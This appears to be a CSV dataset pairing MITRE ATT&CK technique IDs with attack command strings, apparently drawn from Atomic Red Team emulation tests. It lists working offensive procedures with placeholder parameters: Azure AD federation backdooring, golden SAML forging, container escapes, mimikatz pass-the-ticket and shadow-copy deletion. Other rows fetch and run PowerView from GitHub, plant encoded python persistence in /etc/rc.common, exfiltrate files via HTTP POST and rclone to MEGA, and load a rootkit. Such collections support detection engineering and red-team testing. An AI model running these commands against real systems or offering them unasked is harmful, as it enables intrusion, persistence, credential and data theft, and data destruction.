mitre_id,command
T1484,"import-module azuread import-module aadinternals $pword = convertto-securestring -string ""#{azure_password}"" -asplaintext -force $credential = new-object -typename system.management.automation.pscredential -argumentlist ""#{azure_username}"", $pword try { connect-azuread -credential $credential -erroraction stop > $null } catch { write-host ""error: azuread could not connect"" exit 1 } try { $domain = get-azureaddomain -name ""#{domain_name}"" } catch { write-host ""error: domain """"#{domain_name}"""" not found"" exit 1 } if (-not $domain.isverified) { write-host ""error: domain """"#{domain_name}"""" not verified"" exit 1 } if ($domain.authenticationtype -eq ""federated"") { write-host ""error: domain """"#{domain_name}"""" already federated. try with a different domain or re-create it before."" exit 1 } $at = get-aadintaccesstokenforaadgraph -credentials $credential if (-not $at) { write-host ""error: aadinternals could not connect"" exit 1 } $new = convertto-aadintbackdoor -accesstoken $at -domainname ""#{domain_name}"" if ($new) { write-host ""federation successfully added to azure ad"" write-host $new } else { write-host ""the federation setup failed"" } write-host ""end of federation configuration."" # id_7099"
T1651,"import-module ""pathtoatomicsfolder/t1651/src/t1651-1/awsssmattack.ps1"" -force $access_key = ""#{access_key}"" $secret_key = ""#{secret_key}"" $session_token = ""#{session_token}"" $aws_profile = ""#{profile}"" $region = ""#{region}"" set-awsauthentication -accesskey $access_key -secretkey $secret_key -sessiontoken $session_token -awsprofile $aws_profile -awsregion $region invoke-terraform -terraformcommand init -terraformdirectory ""pathtoatomicsfolder/t1651/src/t1651-1"" invoke-terraform -terraformcommand apply -terraformdirectory ""pathtoatomicsfolder/t1651/src/t1651-1"" -terraformvariables @(""profile=t1651-1"", ""region=$region"") invoke-ssmattack -awsprofile ""t1651-1"" -terraformdirectory ""pathtoatomicsfolder/t1651/src/t1651-1"" invoke-terraform -terraformcommand destroy -terraformdirectory ""pathtoatomicsfolder/t1651/src/t1651-1"" -terraformvariables @(""profile=t1651-1"", ""region=$region"") # id_6214"
T1556,"sudo sed -i """" ""#{index}s,^,#{pam_rule}\n,g"" #{path_to_pam_conf}"
T1611,"kubectl --context kind-atomic-cluster run atomic-nsenter-escape-pod --restart=never -ti --rm --image alpine --overrides '{""spec"":{""hostpid"": true, ""containers"":[{""name"":""1"",""image"":""alpine"",""command"":[""nsenter"",""--mount=/proc/1/ns/mnt"",""--"",""/bin/bash""],""stdin"": true,""tty"":true,""securitycontext"":{""privileged"":true}}]}}'   "
T1195,"copy %temp%\explorersync.db %temp%\..\microsoft\explorersync.db schtasks /create /tn explorersync /tr ""javaw -jar %temp%\..\microsoft\explorersync.db"" /sc minute /f # id_3922"
T1622,"# check for common debugger processes $debuggerprocesses = get-process | where-object { $_.processname -match ""dbg"" -or $_.processname -match ""debug"" } # check for debugging flags $debuggingflags = [system.diagnostics.debugger]::isattached  "
T1216,"C:\WINDOWS\SYSTEM32\SYNCAPPVPUBLISHINGSERVER.VBS ""\N;#{COMMAND_TO_EXECUTE}"""
T1078,dsenableroot #current user dsenableroot -u art-tester -p art-tester -r art-root #new user
T1201,get-addefaultdomainpasswordpolicy
T1611,"echo ""current user: #{username}"" sudo -u docker_user sh -c ""sudo docker run -v /:/mnt --rm --name t1611_privesc -it alpine chroot /mnt id"" # id_6162"
T1216,"c:\windows\system32\syncappvpublishingserver.vbs ""\n;#{command_to_execute}"""
T1010,"c:\windows\microsoft.net\framework\v4.0.30319\csc.exe -out:#{output_file_name} ""#{input_source_code}"" #{output_file_name}"
T1006,"$buffer = new-object byte[] 11 $handle = new-object io.filestream ""\\.\#{volume}"", 'open', 'read', 'readwrite' $handle.read($buffer, 0, $buffer.length) $handle.close() format-hex -inputobject $buffer  "
T1114,"$ss = convertto-securestring ""#{password}"" -asplaintext -force $cred = new-object pscredential -argumentlist '#{username}', $ss $param = @{ credential = $cred force = $true } $null = connect-azaccount @param $token = (get-azaccesstoken -resourcetypename msgraph -erroraction stop).token $cert = new-selfsignedcertificate -subject ""cn=powershell application"" -certstorelocation ""cert:\currentuser\my"" -keyexportpolicy exportable -keyspec signature -keylength 2048 -keyalgorithm rsa -hashalgorithm sha256 $reqresourceaccess = ( @{ ""resourceaccess"" = (@{""id""= ""570282fd-fa5c-430d-a7fd-fc8dc98a9dca""; ""type""= ""scope""}, @{ ""id""= ""7427e0e9-2fba-42fe-b0c0-848c9e6a8182""; ""type""= ""scope""}, @{""id""= ""37f7f235-527c-4136-accd-4a02d197296e""; ""type""= ""scope""}, @{""id""= ""14dad69e-099b-42c9-810b-d002981feec1""; ""type""= ""scope""}, @{ ""id""= ""e1fe6dd8-ba31-4d61-89e7-88639da4683d""; ""type""= ""scope""}, @{ ""id""= ""810c84a8-4a9e-49e6-bf7d-12d183f40d01""; ""type""= ""role""}); ""resourceappid"" = ""00000003-0000-0000-c000-000000000000"" }) connect-mggraph -accesstoken $token $context = get-mgcontext $users = get-mguser $app = new-mgapplication -displayname ""t1114.002 atomic test #1 - office365 - remote email collection"" -requiredresourceaccess $reqresourceaccess -web @{ redirecturis=""http://localhost""; } -keycredentials @(@{ type=""asymmetricx509cert""; usage=""verify""; key=$cert.rawdata }) new-mgserviceprincipal -appid $app.appid -additionalproperties @{} | out-null $resourcespn = get-mgserviceprincipal -filter ""appid eq '$($app.appid)'"" $graphapiapp = get-mgserviceprincipal -filter ""displayname eq 'microsoft graph'"" $mailrole = $graphapiapp.approles|where-object value -eq ""mail.read"" new-mgserviceprincipalapproleassignment -serviceprincipalid $resourcespn.id -principalid $resourcespn.id -resourceid $graphapiapp.id -approleid $mailrole.id $mailbox1 = ""#{1st_target_mailbox}"" $mailbox2 = ""#{2nd_target_mailbox}"" $mailbox3 = ""#{3rd_target_mailbox}"" [system.collections.arraylist]$selectusers = @() foreach ($user in $users) {if (($user.mail -eq $mailbox1) -or ($user.mail -eq $mailbox2) -or ($user.mail -eq $mailbox3)){$selectusers.add($user.id)}} connect-mggraph -clientid $app.appid -tenantid $context.tenantid -certificatename $cert.subjectname.name foreach ($user in $selectusers) { $url= ""https://graph.microsoft.com/v1.0/users/$($user)/messages"" ; invoke-mggraphrequest -uri $url -method get -outputtype psobject}"
T1012,"get-item -path ""hklm:software\microsoft\windows nt\currentversion\windows"" get-childitem -path ""hklm:software\microsoft\windows nt\currentversion\"" | findstr windows get-item -path ""hklm:software\microsoft\windows\currentversion\runservicesonce"" get-item -path ""hkcu:software\microsoft\windows\currentversion\runservicesonce"" get-item -path ""hklm:software\microsoft\windows\currentversion\runservices"" get-item -path ""hkcu:software\microsoft\windows\currentversion\runservices"" get-item -path ""hklm:software\microsoft\windows nt\currentversion\winlogon\notify"" get-item -path ""hklm:software\microsoft\windows nt\currentversion\winlogon\userinit"" get-item -path ""hkcu:software\microsoft\windows nt\currentversion\winlogon\\shell"" get-item -path ""hklm:software\microsoft\windows nt\currentversion\winlogon\\shell"" get-item -path ""hklm:software\microsoft\windows\currentversion\shellserviceobjectdelayload"" get-item -path ""hklm:software\microsoft\windows\currentversion\runonce"" get-item -path ""hklm:software\microsoft\windows\currentversion\runonceex"" get-item -path ""hklm:software\microsoft\windows\currentversion\run"" get-item -path ""hkcu:software\microsoft\windows\currentversion\run"" get-item -path ""hkcu:software\microsoft\windows\currentversion\runonce"" get-item -path ""hklm:software\microsoft\windows\currentversion\policies\explorer\run"" get-item -path ""hkcu:software\microsoft\windows\currentversion\policies\explorer\run"" get-childitem -path ""hklm:system\currentcontrolset\services"" get-item -path ""hklm:software\microsoft\windows\currentversion\run"" get-item -path ""hklm:system\currentcontrolset\control\safeboot"" get-childitem -path ""hklm:software\microsoft\active setup\installed components"" get-childitem -path ""hklm:software\microsoft\windows\currentversion\group policy\scripts\startup"" # id_4722"
T1558,"cmd.exe /c ""#{local_folder}\#{local_executable}"" asreproast /outfile:""#{local_folder}\#{out_file}"" # id_2547"
T1496,yes > /dev/null # id_2124
T1014,sudo insmod #{rootkit_path}/#{rootkit_name}.ko # id_9452
T1098,aws iam create-group --group-name #{username} aws iam add-user-to-group --user-name #{username} --group-name #{username} # id_4465
T1197,bitsadmin.exe /transfer /download /priority foreground #{remote_file} #{local_file}   
T1137,"$excelapp = new-object -comobject ""excel.application"" if(-not $excelapp.path.contains(""program files (x86)"")){ write-host ""64-bit office"" $excelapp.registerxll(""pathtoatomicsfolder\t1137.006\bin\addins\excelxll_x64.xll"") } else{ write-host ""32-bit office"" $excelapp.registerxll(""pathtoatomicsfolder\t1137.006\bin\addins\excelxll_x86.xll"") }   "
T1505,%windir%\system32\inetsrv\appcmd.exe install module /name:#{module_name} /image:#{dll_path}
T1489,taskkill.exe /f /im #{process_name}
T1651,"import-module ""pathtoatomicsfolder/t1651/src/t1651-1/awsssmattack.ps1"" -force $access_key = ""#{access_key}"" $secret_key = ""#{secret_key}"" $session_token = ""#{session_token}"" $aws_profile = ""#{profile}"" $region = ""#{region}"" set-awsauthentication -accesskey $access_key -secretkey $secret_key -sessiontoken $session_token -awsprofile $aws_profile -awsregion $region invoke-terraform -terraformcommand init -terraformdirectory ""pathtoatomicsfolder/t1651/src/t1651-1"" invoke-terraform -terraformcommand apply -terraformdirectory ""pathtoatomicsfolder/t1651/src/t1651-1"" -terraformvariables @(""profile=t1651-1"", ""region=$region"") invoke-ssmattack -awsprofile ""t1651-1"" -terraformdirectory ""pathtoatomicsfolder/t1651/src/t1651-1"" invoke-terraform -terraformcommand destroy -terraformdirectory ""pathtoatomicsfolder/t1651/src/t1651-1"" -terraformvariables @(""profile=t1651-1"", ""region=$region"")"
T1090,"invoke-expression 'cmd /c start powershell -command {cmd /c ""#{torexe}""}' sleep -s 60 stop-process -name ""tor"" | out-null"
T1037,"filename='/etc/rc.common';if [ ! -f $filename ];then sudo touch $filename;else sudo cp $filename /etc/rc.common.original;fi printf '%s\n' '#!/bin/bash' | sudo tee /etc/rc.common echo ""python3 -c \""import os, base64;exec(base64.b64decode('aw1wb3j0ig9zcm9zlnbvcgvukcdly2hvigf0b21pyyb0zxn0igzvcibtb2rpznlpbmcgcmmuy29tbw9uid4gl3rtcc9umtazny4wmdqucmmuy29tbw9ujykk'))\"""" | sudo tee -a /etc/rc.common printf '%s\n' 'exit 0' | sudo tee -a /etc/rc.common sudo chmod +x /etc/rc.common"
T1074,"compress-archive -path ""#{input_file}"" -destinationpath #{output_file} -force # id_6656"
T1560,zip -r #{input_folder}/#{input_file}.zip #{input_folder} openssl enc -aes-256-cbc -pass pass:#{enc_pass} -p -in #{input_folder}/#{input_file}.zip -out #{input_folder}/#{input_file}.enc cat #{input_folder}/#{input_file}.enc | base64
T1069,[net.servicepointmanager]::securityprotocol = [net.securityprotocoltype]::tls12 iex (iwr 'https://raw.githubusercontent.com/powershellmafia/powersploit/f94a5d298a1b4c5dfb1f30a246d9c73d13b22888/recon/powerview.ps1' -usebasicparsing); invoke-enumeratelocaladmin -verbose   
T1048,"wget --post-data=""msg=atomictestt1048.002"" --timeout=5 --no-check-certificate #{endpoint_domain} --delete-after"
T1566,$url = 'https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/t1566.001/bin/phishingattachment.xlsm' [net.servicepointmanager]::securityprotocol = [net.securityprotocoltype]::tls12 invoke-webrequest -uri $url -outfile $env:temp\phishingattachment.xlsm # id_6551
T1606,"import-module aadinternals -force $saml = new-aadintsamltoken -immutableid ""#{immutable_id}"" -pfxfilename ""#{certificate_path}"" -issuer ""#{issuer_uri}"" $conn = get-aadintaccesstokenforaadgraph -samltoken $saml -savetocache if ($conn) { write-host ""`nsuccessfully connected as $($conn.user)"" } else { write-host ""`nthe connection failed"" } write-host ""end of golden saml"""
T1550,"""#{mimikatz_exe}"" ""kerberos::ptt #{ticket}"""
T1123,reg add hklm\software\microsoft\windows\currentversion\capabilityaccessmanager\consentstore\microphone\nonpackaged\c:#windows#temp#atomic.exe /v lastusedtimestart /t reg_binary /d a273b6f07104d601 /f reg add hklm\software\microsoft\windows\currentversion\capabilityaccessmanager\consentstore\microphone\nonpackaged\c:#windows#temp#atomic.exe /v lastusedtimestop /t reg_binary /d 96ef514b7204d601 /f
T1570,new-smbmapping -remotepath '#{remote_path}' -transporttype quic -skipcertificatecheck copy '#{local_file}' 'z:\' # id_3571
T1490,vssadmin.exe delete shadows /all /quiet 
T1059,#{soaphound_path} --user $(#{user})@$(#{domain}) --password #{password} --dc #{dc} --buildcache --cachefilename #{cachefilename}
T1622,"# CHECK FOR COMMON DEBUGGER PROCESSES $DEBUGGERPROCESSES = GET-PROCESS | WHERE-OBJECT { $_.PROCESSNAME -MATCH ""DBG"" -OR $_.PROCESSNAME -MATCH ""DEBUG"" } # CHECK FOR DEBUGGING FLAGS $DEBUGGINGFLAGS = [SYSTEM.DIAGNOSTICS.DEBUGGER]::ISATTACHED"
T1027,"start-process ""#{exe_binary}"" start-sleep -seconds 7 if (test-path ""c:\users\default\appdata\local\temp\hello.log"") { remove-item ""c:\users\default\appdata\local\temp\hello.log"" -force; write-host ""[+] hello.log removed."" } # id_4335"
T1649,"$archive=""$env:public\t1649\atomic_certs.zip"" $exfilpath=""$env:public\t1649\certs"" add-type -assembly ""system.io.compression.filesystem"" remove-item $(split-path $exfilpath) -recurse -force -erroraction ignore mkdir $exfilpath | out-null foreach ($cert in (gci cert:\currentuser\my)) { export-certificate -cert $cert -filepath $exfilpath\$($cert.friendlyname).cer} [io.compression.zipfile]::createfromdirectory($exfilpath, $archive) # id_9103"
T1546,"$o= [activator]::createinstance([type]::gettypefromclsid(""9ba05972-f6a8-11cf-a442-00a0c90a8f39"")) $item = $o.item() $item.document.application.shellexecute(""cmd.exe"",""/c calc.exe"",""c:\windows\system32"",$null,0)"
T1505,"install-transportagent -name #{transport_agent_identity} -transportagentfactory #{class_factory} -assemblypath #{dll_path} enable-transportagent #{transport_agent_identity} get-transportagent | format-list name,enabled"
T1654,WEVTUTIL ENUM-LOGS
T1553,"openssl genrsa -out #{key_filename} 4096 openssl req -x509 -new -nodes -key #{key_filename} -sha256 -days 365 -subj ""/c=us/st=denial/l=springfield/o=dis/cn=www.example.com"" -out #{cert_filename} cp #{cert_filename} /usr/local/share/certs/ certctl rehash  "
T1201,[net.servicepointmanager]::securityprotocol = [net.securityprotocoltype]::tls12 iex (iwr 'https://raw.githubusercontent.com/powershellmafia/powersploit/master/recon/powerview.ps1' -usebasicparsing); get-domainpolicy -verbose
T1136,"dscl . -create /users/#{username} dscl . -create /users/#{username} usershell /bin/zsh dscl . -create /users/#{username} realname ""#{realname}"" dscl . -create /users/#{username} uniqueid ""1010"" dscl . -create /users/#{username} primarygroupid 80 dscl . -create /users/#{username} nfshomedirectory /users/#{username} # id_4397"
T1136,kubectl run #{pod_name} --image=#{image_name} --restart=never --rm -it -- sh -lc 'adduser -d #{username} && id #{username}'
T1049,if command -v ss >/dev/null 2>&1; then ss -antp 2>/dev/null || ss -ant; ss -aunp 2>/dev/null || true; else lsof -i -np 2>/dev/null || true; fi
T1021,"reg add ""hklm\system\currentcontrolset\control\terminal server\winstations\rdp-tcp"" /v portnumber /t reg_dword /d #{new_remote_port} /f netsh advfirewall firewall add rule name=""rdpportlatest-tcp-in"" dir=in action=allow protocol=tcp localport=#{new_remote_port}"
T1580,AWS EC2 DESCRIBE-SECURITY-GROUPS --PROFILE #{AWS_PROFILE} --OUTPUT #{OUTPUT_FORMAT}
T1074,"compress-archive -path ""#{input_file}"" -destinationpath #{output_file} -force  "
T1030,"$file = [system.io.file]::openread(#{source_file_path}) $chunksize = #{chunk_size} * 1kb $buffer = new-object byte[] $chunksize while ($bytesread = $file.read($buffer, 0, $buffer.length)) { $encodedchunk = [convert]::tobase64string($buffer, 0, $bytesread) invoke-webrequest -uri #{destination_url} -method post -body $encodedchunk } $file.close() "
T1518,"/usr/libexec/plistbuddy -c ""print :cfbundleshortversionstring"" /applications/safari.app/contents/info.plist /usr/libexec/plistbuddy -c ""print :cfbundleversion"" /applications/safari.app/contents/info.plist"
T1127,"#{MSBUILDPATH}\#{MSBUILDNAME} ""#{FILENAME}"""
T1119,get-service > $env:temp\t1119_1.txt get-childitem env: > $env:temp\t1119_2.txt get-process > $env:temp\t1119_3.txt
T1047,"wmic /node:""#{node}"" service where (caption like ""%#{service_search_string}%"")  "
T1135,smbstatus --shares
T1090,netsh interface portproxy add v4tov4 listenport=#{listenport} connectport=#{connectport} connectaddress=#{connectaddress} # id_1634
T1567,"new-item #{rclone_config_path}\rclone -itemtype directory new-item #{rclone_config_path}\rclone\rclone.conf cd ""#{rclone_path}"" .\rclone.exe config create #{remote_share} mega set-content #{rclone_config_path}\rclone\rclone.conf ""[#{remote_share}] `n type = mega `n user = #{mega_user_account} `n pass = #{mega_user_password}"" .\rclone.exe copy --max-size 1700k ""#{dir_to_copy}"" #{remote_share}:test -v # id_1837"
